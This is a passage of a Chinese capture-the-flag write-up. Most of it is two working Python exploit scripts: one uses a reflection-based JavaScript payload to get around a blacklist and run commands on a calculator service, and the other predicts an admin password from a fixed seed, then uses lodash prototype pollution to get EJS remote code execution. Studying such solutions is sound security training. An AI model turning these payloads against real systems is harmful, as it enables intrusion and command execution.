HTTP请求头中，而没有对CRLF字符进行过滤，攻击者就可以通过注入\r\n来"截断"当前请求头
，并伪造新的请求头，从而实现HTTP请求走私（HTTP Request Smuggling）或请求头注入攻击。
# 24.眼熟的计算器
#### 解：
反编译jar包看源码
![](/images/20260514204212.png)
这里借用了大佬的脚本
```python
import requests
import urllib.parse
import re
 
host = "目标地址"
url = f"{host}/calc"
 
# 绕过黑名单: "java.lang.Runtime", "new"
# 使用字符串拼接 + 反射获取 Scanner 构造器 + newInstance 调用
exploit_js = r'''
var rtName = 'java.lang.Run' + 'time';
var Runtime = Java.type(rtName);
var runtime = Runtime.getRuntime();
var p = runtime.exec('cat /flag');
var is = p.getInputStream();
var Scanner = Java.type('java.util.Scanner');
var InputStream = Java.type('java.io.InputStream');
var StringClass = Java.type('java.lang.String');
var constr = Scanner.class.getConstructor(InputStream.class, StringClass.class);
var n = 'n'; var e = 'e'; var w = 'w';
var methodName = n + e + w + 'Instance';
var scanner = constr[methodName](is, 'UTF-8');
scanner.useDelimiter('\\A');
var result = scanner.hasNext() ? scanner.next() : '';
if (result === '') {
  var es = p.getErrorStream();
  var constr_es = Scanner.class.getConstructor(InputStream.class, StringClass.class);
  var scanner_es = constr_es[methodName](es, 'UTF-8');
  scanner_es.useDelimiter('\\A');
  result = scanner_es.hasNext() ? scanner_es.next() : '';
}
scanner.close();
result;
'''
 
def send_request(content):
    encoded = urllib.parse.quote(content)
    target = url + "?content=" + encoded
    try:
        r = requests.get(target, timeout=30)
        return r.text
    except Exception as e:
        print("Request error:", e)
        return None
 
def main():
    print("Sending exploit payload...")
    text = send_request(exploit_js)
    if text:
        # 提取 flag
        match = re.search(r'flag\{[^}]*\}', text)
        if match:
            print("Flag found:", match.group(0))
        else:
            print("Flag not found in output. Raw response:")
            print(text)
    else:
        print("Request failed.")
 
if __name__ == "__main__":
    main()
```
就拿到flag！！！
# 25.小 W 和小 K 的故事（最终章）
####  解：
考察原型链污染，题目使用固定种子预测 Admin 密码后登录；
通过 /addUser 路由中的 lodash.defaultsDeep(users, req.body)向全局 Object.prototype 注入 client=true 和恶意 escapeFunction；
最终，当访问 / 路由触发 res.render('index', ...) 渲染 EJS 模板时，EJS 会误将全局原型链上的恶意属性视为有效渲染选项并执行 escapeFunction，从而实现 RCE 获取 Flag。
下面借用了大佬的exp：
```python
import requests
import json
import re
import sys
 
# --- Configuration ---
TARGET_URL = "目标地址"
ADMIN_USERNAME = 'admin'
PRNG_SEED = 114514
 
requests.packages.urllib3.disable_warnings()
 
 
# --- PRNG Calculation ---
class PRNG:
    MODULUS = 998244353
    MULTIPLIER = 48271
    CHARSET = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
 
    def __init__(self, seed):
        self.seed = seed % self.MODULUS
 
    def next_int(self):
        self.seed = (self.seed * self.MULTIPLIER) % self.MODULUS
        return self.seed
 
    def get_random_int(self, min_val, max_val):
        return min_val + (self.next_int() % (max_val - min_val))
 
    def get_random_string(self, length):
        result = ""
        for _ in range(length):
            random_index = self.get_random_int(0, len(self.CHARSET))
            result += self.CHARSET[random_index]
        return result
 
 
def calculate_admin_password(seed):
    rng = PRNG(seed)
    rng.get_random_string(16)  # Session Secret (State change)
    return rng.get_random_string(16)  # Admin Password
 
 
# --- Main Exploit Function ---
def exploit_rce():
    session = requests.Session()
 
    # 1. Calculate password and login
    admin_password = calculate_admin_password(PRNG_SEED)
    print(f"🔑 Admin Password: {admin_password}")
 
    login_url = f"{TARGET_URL}/login"
    login_payload = {"username": ADMIN_USERNAME, "password": admin_password}
 
    try:
        session.post(login_url, json=login_payload, allow_redirects=False, verify=False)
    except requests.exceptions.RequestException as e:
        print(f"❌ Login error: {e}");
        sys.exit(1)
 
    if 'session' not in session.cookies:
        print("❌ Login failed. Exiting.");
        sys.exit(1)
 
    print("✅ Logged in.")
 
    # 2. Prototype Pollution Payload
    rce_payload_value = f"1; return global.process.mainModule.constructor._load('child_process').execSync('cat /flag').toString(); //"
 
    pollution_payload = {
        "constructor": {
            "prototype": {
                "client": True,
                "escapeFunction": rce_payload_value
            }
        }
    }
 
    # 3. Trigger Pollution via /addUser (lodash.defaultsDeep)
    add_user_url = f"{TARGET_URL}/addUser"
    try:
        session.post(add_user_url, json=pollution_payload, allow_redirects=False, verify=False)
        print("✅ Pollution payload sent.")
    except requests.exceptions.RequestException as e:
        print(f"❌ Pollution request error: {e}");
        sys.exit(1)
 
    # 4. Trigger EJS RCE (GET /)
    trigger_url = f"{TARGET_URL}/"
    print("🔥 Triggering RCE...")
 
    try:
        response = session.get(trigger_url, verify=False)
        flag_match = re.search(r'ichiq\{[a-zA-Z0-9_-]+\}', response.text)
 
        if flag_match:
            print("\n🎉 **Flag Found!** 🎉")
            print("====================================")
            print(f"FLAG: **{flag_match.group(0)}**")
            print("====================================")
        else:
            print("\n🤔 Flag not matched. Check response snippet:")
            print(response.text[:500])
 
    except requests.exceptions.RequestException as e:
        print(f"❌ RCE trigger error: {e}")
 
 
if __name__ == "__main__":
    exploit_rce()
```
就能拿到flag！！！
